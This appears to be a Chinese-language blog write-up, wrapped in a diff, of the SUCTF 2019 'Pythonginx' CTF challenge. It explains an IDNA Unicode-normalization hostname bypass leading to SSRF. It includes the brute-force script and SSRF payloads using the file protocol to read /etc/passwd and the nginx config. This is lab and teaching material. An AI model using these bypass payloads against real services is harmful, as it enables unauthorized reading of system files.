@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html>
+  <!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+  
+  <title>suctf2019-Pythonginx - LionTree</title>
+  <link rel="icon" href="https://i.imgur.com/SrZt9VU.jpg" type="image/x-icon">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
+  
+  <meta name="keywords" content=writeup,idna>
+  
+  
+  
+    <link rel="alternate" href="/atom.xml " title="LionTree" type="application/atom+xml">
+  
+
+  
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 4.2.1"></head>
+
+  <body>
+    <div class="container">
+      <header class="header">
+  <div class="blog-title">
+    <a href="/" class="logo">LionTree</a>
+    <div class="subtitle"></div>
+  </div>
+  <nav class="navbar">
+    <ul class="menu">
+      
+        <li class="menu-item">
+          <a href="/" class="menu-item-link">Home</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/summary" class="menu-item-link">Summary</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/about" class="menu-item-link">About</a>
+        </li>
+      
+        <li class="menu-item">
+          <a href="/atom.xml" class="menu-item-link">RSS</a>
+        </li>
+      
+    </ul>
+  </nav>
+</header>
+
+<article class="post">
+  <div class="post-title">
+    <h1 class="article-title">suctf2019-Pythonginx</h1>
+  </div>
+
+  <!-- 文章目录 -->
+  
+
+  <div class="post-content">
+    <p>suctf2019的web3<br>buuoj上的环境:<a href="https://buuoj.cn/challenges#[SUCTF%202019]Pythonginx" target="_blank" rel="noopener">https://buuoj.cn/challenges#[SUCTF%202019]Pythonginx</a></p>
+<p>打开得到后端源码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route('/getUrl', methods=['GET', 'POST'])</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">()</span>:</span></span><br><span class="line">    url = request.args.get(<span class="string">"url"</span>)</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 111"</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 222 "</span> + host</span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    <span class="comment">#去掉 url 中的空格</span></span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">"我扌 your problem? 333"</span></span><br></pre></td></tr></table></figure>
+<p>还有两个hint是</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- Do you know the nginx? --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>这里的限制是url参数在前两轮的验证中不能是suctf.cc，在最后一轮又必须变成suctf.cc,满足条件就可以触发ssrf<br>关键代码其实就是这个</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
+<p>idna指国际化域名标签，也就是包含其他语言字符的域名,比如包含中文的域名<br>这题考察的是2019blackhat的一个议题<br><a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf</a></p>
+<p>这里简单的记录一下里面和这题相关的内容:</p>
+<ul>
+<li>国际化域名的工作原理是把unicode编码的域名转化为ascii编码，这个过程有两步:<ol>
+<li>unicode标准化,把unicode转化为标准形式。比如FISKMÅS会转化为FISKMåS,也就是Å (U+00C5)转化为了å (U+00E5)</li>
+<li>punycoding,将unicode 转化为ascii。最终FISKMÅS转化为xn–fiskms-mua<br><img src="/images/punycoding.PNG" alt="punycode结构"></li>
+</ol>
+</li>
+</ul>
+<p>问题出在unicode标准化的过程，一些unicode字符标准化后会变成带有特殊字符的ascii字符，或者只有ascii字符</p>
+<p>比如℀标准化后变为a/c，这时已经是ascii字符，不需要punycoding了<br>因此下面这个url</p>
+<blockquote>
+<p><a href="https://evil.c℀.Example.com">https://evil.c℀.Example.com</a></p>
+</blockquote>
+<p>会变成</p>
+<blockquote>
+<p><a href="https://evil.ca/c.Example.com" target="_blank" rel="noopener">https://evil.ca/c.Example.com</a></p>
+</blockquote>
+<p>回到这题</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br></pre></td></tr></table></figure>
+<p>这段代码也就是会进行一个idn域名的翻译操作<br>也就是我们需要找一个unicode字符，标准化之后直接变为ascii字符,而不是punycode<br>这里可以像de1ta的大佬们一样去爆破suctf.cc最后一个c<br>贴上他们的脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> urllib.parse <span class="keyword">import</span> urlparse,urlunsplit,urlsplit</span><br><span class="line"><span class="keyword">from</span> urllib <span class="keyword">import</span> parse</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_unicode</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> range(<span class="number">65536</span>):</span><br><span class="line">        uni=chr(x)</span><br><span class="line">        url=<span class="string">"http://suctf.c&#123;&#125;"</span>.format(uni)</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> getUrl(url):</span><br><span class="line">                print(<span class="string">"str: "</span>+uni+<span class="string">' unicode: \\u'</span>+str(hex(x))[<span class="number">2</span>:])</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getUrl</span><span class="params">(url)</span>:</span></span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    newhost = []</span><br><span class="line">    <span class="keyword">for</span> h <span class="keyword">in</span> host.split(<span class="string">'.'</span>):</span><br><span class="line">        newhost.append(h.encode(<span class="string">'idna'</span>).decode(<span class="string">'utf-8'</span>))</span><br><span class="line">    parts[<span class="number">1</span>] = <span class="string">'.'</span>.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(<span class="string">' '</span>)[<span class="number">0</span>]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    <span class="keyword">if</span> host == <span class="string">'suctf.cc'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__==<span class="string">"__main__"</span>:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>
+<p>最后的结果</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">str: ℂ unicode: \u2102</span><br><span class="line">str: ℅ unicode: \u2105</span><br><span class="line">str: ℆ unicode: \u2106</span><br><span class="line">str: ℭ unicode: \u212d</span><br><span class="line">str: Ⅽ unicode: \u216d</span><br><span class="line">str: ⅽ unicode: \u217d</span><br><span class="line">str: Ⓒ unicode: \u24b8</span><br><span class="line">str: ⓒ unicode: \u24d2</span><br><span class="line">str: Ｃ unicode: \uff23</span><br><span class="line">str: ｃ unicode: \uff43</span><br></pre></td></tr></table></figure>
+<p>也可以从表中去挑<br><a href="https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols" target="_blank" rel="noopener">https://en.wiktionary.org/wiki/Appendix:Unicode/Letterlike_Symbols</a><br><a href="https://unicode-table.com/cn/#miscellaneous-symbols" target="_blank" rel="noopener">https://unicode-table.com/cn/#miscellaneous-symbols</a></p>
+<p>根据前面的提示</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Dont worry about the suctf.cc. Go on! --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>可以想到hosts文件中suctf.cc绑定了localhost，直接利用file协议就可以利用这个ssrf去读文件<br>比如</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;suctf.cℂ&#x2F;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
+<p>这里会发现根目录下没有flag文件，可以根据另一个hint</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- Do you know the nginx? --&gt;</span></span><br></pre></td></tr></table></figure>
+<p>想到去读nginx的配置文件</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:&#x2F;&#x2F;suctf.cℂ&#x2F;..&#x2F;..&#x2F;..&#x2F;usr&#x2F;local&#x2F;nginx&#x2F;conf&#x2F;nginx.conf</span><br></pre></td></tr></table></figure>
+<p>可以得到flag的位置在/usr/fffffflag</p>
+
+  </div>
+  <div class="post-meta">
+    <span class="post-time" style="color:#646060;font-size:13px">2019-08-27</span>
+  </div>
+
+  <div class="post-footer">
+    
+      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/idna/" rel="tag">idna</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li></ul>
+    
+
+    <a href="#top" class="top">Back to Top</a>
+  </div>
+</article>
+
+<!-- 评论插件 -->
+
+<footer>
+  2022
+  <span class="author">
+    LionTree
+  </span>
+</footer>
+
+
+    </div>
+  </body>
+</html>
